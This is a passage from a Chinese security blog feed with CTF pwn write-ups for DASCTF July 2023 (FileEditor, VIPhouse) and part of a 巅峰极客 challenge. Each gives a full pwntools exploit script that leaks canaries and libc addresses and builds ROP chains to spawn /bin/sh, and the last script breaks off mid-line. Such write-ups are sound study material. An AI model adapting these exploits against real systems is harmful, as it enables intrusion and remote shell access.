id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.jianshu.com/p/5c1330632fc7">https://www.jianshu.com/p/5c1330632fc7</a></p><p><a href="https://blog.csdn.net/andrewgithub/article/details/107372276">https://blog.csdn.net/andrewgithub/article/details/107372276</a></p><p><a href="https://zhuanlan.zhihu.com/p/40407669">https://zhuanlan.zhihu.com/p/40407669</a></p><p><a href="https://bbs.kanxue.com/thread-272634.htm">https://bbs.kanxue.com/thread-272634.htm</a></p><p><a href="https://7ee1n.github.io/2021/10/11/ciscoRV130w/">https://7ee1n.github.io/2021/10/11/ciscoRV130w/</a></p><p><a href="https://badmonkey.site/archives/cisco-rv110w-upnp-0day">https://badmonkey.site/archives/cisco-rv110w-upnp-0day</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve upnp mips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023-dasctf7月部分复现-pwn</title>
    <link href="/2023/07/23/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/"/>
    <url>/2023/07/23/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/</url>
    
    <content type="html"><![CDATA[<h1 id="2023-dasctf7月部分复现-pwn"><a href="#2023-dasctf7月部分复现-pwn" class="headerlink" title="2023-dasctf7月部分复现-pwn"></a>2023-dasctf7月部分复现-pwn</h1><h2 id="FileEditor"><a href="#FileEditor" class="headerlink" title="FileEditor"></a>FileEditor</h2><p>这个题在比赛时始终没找到漏洞，真栓Q。</p><p>查看保护。</p><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725153648174.png" alt="image-20230725153648174"></p><p>题目维护了一个简单的结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">int</span> flag;<br>  <span class="hljs-type">char</span> content[<span class="hljs-number">204</span>];<br>  file *next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>题目有很多复杂的功能，做到了文件的增删改查，以及字符串的查找与替换。</p><p>题目漏洞点是，在查找字符串是存在栈溢出。</p><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725154049407.png" alt="image-20230725154049407"></p><p>这么明显都没看到，果然我还是该锻炼锻炼眼力了。</p><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725154201384.png" alt="image-20230725154201384"></p><p>这个函数也是千奇百怪的，明显是为了出题而设计的。无语。。。</p><p>解题思路如下：</p><ol><li>利用查找字符串功能，将栈中内容复制到content中</li><li>利用修改功能，逐个覆盖’\x00’为’\n’，泄露canary，以及libc地址</li><li>直接打rop链</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">29655</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; choose:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dasopen</span>():<br>    menu(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    menu(<span class="hljs-number">2</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">insert</span>(<span class="hljs-params">line, nums, content: <span class="hljs-built_in">list</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;please enter n m:&#x27;</span>, <span class="hljs-built_in">str</span>(line))<br>    p.sendline(<span class="hljs-built_in">str</span>(nums))<br>    p.recvuntil(<span class="hljs-string">&#x27;be inserted in sequence:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nums):<br>        p.sendline(content[i])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">pos, nums</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;lines to delete&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(pos))<br>    p.sendline(<span class="hljs-built_in">str</span>(nums))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">modify</span>(<span class="hljs-params">line, content</span>):<br>    menu(<span class="hljs-number">6</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;number to be modified:&#x27;</span>, <span class="hljs-built_in">str</span>(line))<br>    p.sendlineafter(<span class="hljs-string">&#x27;new content:&#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>(<span class="hljs-params">search</span>):<br>    menu(<span class="hljs-number">7</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;string to search for:&#x27;</span>, search)<br>    p.sendlineafter(<span class="hljs-string">&#x27;continue searching? (y/n)&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save</span>():<br>    menu(<span class="hljs-number">9</span>)<br><br><br>dasopen()<br><br>insert(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, [<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x62</span> + <span class="hljs-string">&#x27;l1s00t&#x27;</span>])<br><br>find(<span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br><br>modify(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x62</span> + <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>canary = u64(p.recv(<span class="hljs-number">8</span>)) &gt;&gt; <span class="hljs-number">8</span> &lt;&lt; <span class="hljs-number">8</span><br>lg(<span class="hljs-string">&#x27;canary&#x27;</span>, canary)<br><br>modify(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x72</span> + <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>code_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) &gt;&gt; <span class="hljs-number">8</span> &lt;&lt; <span class="hljs-number">8</span><br>code_base = code_base - <span class="hljs-number">0x1500</span><br>lg(<span class="hljs-string">&#x27;code_base&#x27;</span>, code_base)<br><br>modify(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0xa8</span>)<br>show()<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) &gt;&gt; <span class="hljs-number">8</span> &lt;&lt; <span class="hljs-number">8</span><br>libc_base = libc_base - <span class="hljs-number">0x24000</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br><br>pop_rdi_ret = code_base + <span class="hljs-number">0x0000000000002ac3</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002601f</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x0000000000142c92</span><br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0x62</span>: <span class="hljs-string">&#x27;l1s00t&#x27;</span>,<br>        <span class="hljs-number">0x68</span>: [<br>            canary, <span class="hljs-number">0</span>,<br>            pop_rdi_ret, libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__(),<br>            pop_rsi_ret, <span class="hljs-number">0</span>,<br>            pop_rdx_ret, <span class="hljs-number">0</span>,<br>            execve<br>        ]<br>    &#125;<br>)<br>insert(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, [payload])<br><br><span class="hljs-comment"># dbg()</span><br><br>find(<span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725153246138.png" alt="image-20230725153246138"></p><h2 id="VIPhouse"><a href="#VIPhouse" class="headerlink" title="VIPhouse"></a>VIPhouse</h2><p>这个题栽在了泄露随机字符上。一直在想怎么覆盖掉随机字符，从而绕过检测。没想到师傅们是直接爆破1byte绕过的。</p><p>查看保护。</p><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725101042326.png" alt="image-20230725101042326"></p><p>使用打开文件的方式写入随机数，无法预测。</p><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725101623749.png" alt="image-20230725101623749"></p><p>使用<code>strcpy</code>将随机字符放入栈中，可以想到首字节’\x00’绕过，这样后续的字符也为’\x00’了。所以说，相当于爆破首字节为’\x00’。</p><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725101254804.png" alt="image-20230725101254804"></p><p>login函数存在栈溢出。</p><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725101559124.png" alt="image-20230725101559124"></p><p>注意到login比较的时候，把我们输入的字符串放到了rdi的位置。</p><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725100912317.png" alt="image-20230725100912317"></p><p>同时，能够找到一个比较好用的gadget。两者结合，可以触发格式化字符串漏洞。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">00000000004016<span class="hljs-built_in">DD</span> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><span class="hljs-comment">; call _printf; nop; pop rbp; retn</span><br></code></pre></td></tr></table></figure><p>可以直接打格式化字符串那一套，也可以利用格式化字符串泄露地址，构造rop链。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./viphouse&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-comment"># if debug:</span><br><span class="hljs-comment">#     p = process(fn)</span><br><br><span class="hljs-comment"># else:</span><br><span class="hljs-comment">#     p = remote()</span><br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;an option: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">name, payload</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;your username: &#x27;</span>, name)<br>    p.sendlineafter(<span class="hljs-string">&#x27;your password: &#x27;</span>, payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_canary</span>():<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;number you guess: &#x27;</span>, <span class="hljs-string">&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>    menu(<span class="hljs-number">5</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = process(fn)<br>    login(<span class="hljs-string">&#x27;admin\x00&#x27;</span>, <span class="hljs-string">&#x27;root\x00&#x27;</span>)<br>    leak_canary()<br>    result = p.recvuntil(<span class="hljs-string">&#x27;1. login in&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;gift&#x27;</span> <span class="hljs-keyword">in</span> result:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        p.close()<br><br><br>start = <span class="hljs-number">0x4012d0</span><br><br><span class="hljs-comment"># 00000000004016DD mov eax, 0; call _printf; nop; pop rbp; retn</span><br>myprintf = <span class="hljs-number">0x4016DD</span><br><br>pop_rbp_ret = <span class="hljs-number">0x000000000040139d</span><br>leave_ret = <span class="hljs-number">0x000000000040147b</span><br><br>leak_canary()<br><br>p.recvuntil(<span class="hljs-string">&#x27;gift!&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>), <span class="hljs-number">16</span>)<br>lg(<span class="hljs-string">&#x27;canary&#x27;</span>, canary)<br><br>logout()<br><br><span class="hljs-comment"># dbg()</span><br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: <span class="hljs-string">&quot;l1s00t%11$p%15$p&quot;</span>, <br>        <span class="hljs-number">0x40</span>: [<br>            canary, <span class="hljs-number">0</span>, myprintf, <span class="hljs-number">0</span>, start<br>        ]<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br>login(<span class="hljs-string">&#x27;admin\x00&#x27;</span>, payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x29d90</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x508</span>     <span class="hljs-comment"># login stack</span><br>lg(<span class="hljs-string">&#x27;stack&#x27;</span>, stack)<br><br>logout()<br><br><span class="hljs-comment"># dbg()</span><br><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x000000000002a3e5</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002be51</span><br>pop_rdx_rbx_ret = libc_base + <span class="hljs-number">0x0000000000090529</span><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br><br>payload1 = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: <span class="hljs-string">&#x27;admin&#x27;</span>,<br>        <span class="hljs-number">0x8</span>: <span class="hljs-string">&#x27;/bin/sh&#x27;</span>,<br>        <span class="hljs-number">0x18</span>: [<br>            pop_rdi_ret, stack + <span class="hljs-number">0x8</span>, <br>            pop_rsi_ret, <span class="hljs-number">0</span>,<br>            pop_rdx_rbx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>            execve<br>        ]<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span>, length=<span class="hljs-number">0x60</span><br>)<br><br>payload2 = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: <span class="hljs-string">&quot;l1s00t&quot;</span>, <br>        <span class="hljs-number">0x40</span>: [<br>            canary, stack + <span class="hljs-number">0x10</span>, leave_ret<br>        ]<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br>login(payload1, payload2)<br><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-dasctf7%E6%9C%88%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230725101007541.png" alt="image-20230725101007541"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023-巅峰极客部分复现-pwn</title>
    <link href="/2023/07/23/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/"/>
    <url>/2023/07/23/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/</url>
    
    <content type="html"><![CDATA[<h1 id="2023-巅峰极客部分复现-pwn"><a href="#2023-巅峰极客部分复现-pwn" class="headerlink" title="2023-巅峰极客部分复现-pwn"></a>2023-巅峰极客部分复现-pwn</h1><h2 id="linkmap"><a href="#linkmap" class="headerlink" title="linkmap"></a>linkmap</h2><p>本来以为是一道常规的ret2dlresolve，结果开了Full RELRO保护，就没啥思路了。比赛中就放弃了，转而忙自己的事情了。赛后看wp，发现师傅们是找了一个magic gadget，将read的got表地址写到bss段上。实际上，我当时也看到了那个gadget，但还是没想到利用思路。太菜了。。。</p><p>查看保护</p><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724170702835.png" alt="image-20230724170702835"></p><p>上来就怼了一个栈溢出。</p><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724171043511.png" alt="image-20230724171043511"></p><p>可以找到这样一段gadget，可以控制rbp指向got表，从而将read地址写到bss段上。</p><p><img src="/img/2023-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0-pwn/image-20230724171221611.png" alt="image-20230724171221611"></p><p>大致思路如下：</p><ol><li>栈溢出覆盖rbp为read_got + 8，将read写到bss段上</li><li>调用read_plt，覆盖bss段上read地址最后一位，使其变为syscall</li><li>利用csu的gadget，调用execve</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./ezzzz&#x27;</span><br>elf = ELF(fn)<br>libc = elf.libc<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><br><span class="hljs-keyword">else</span>:<br>    p = remote()<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br>bss = elf.bss() + <span class="hljs-number">0x400</span>     <span class="hljs-comment"># 0x601410</span><br><br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>csu_down = <span class="hljs-number">0x4007D6</span><br>csu_up = <span class="hljs-number">0x4007C0</span><br><br>pop_rdi_ret = 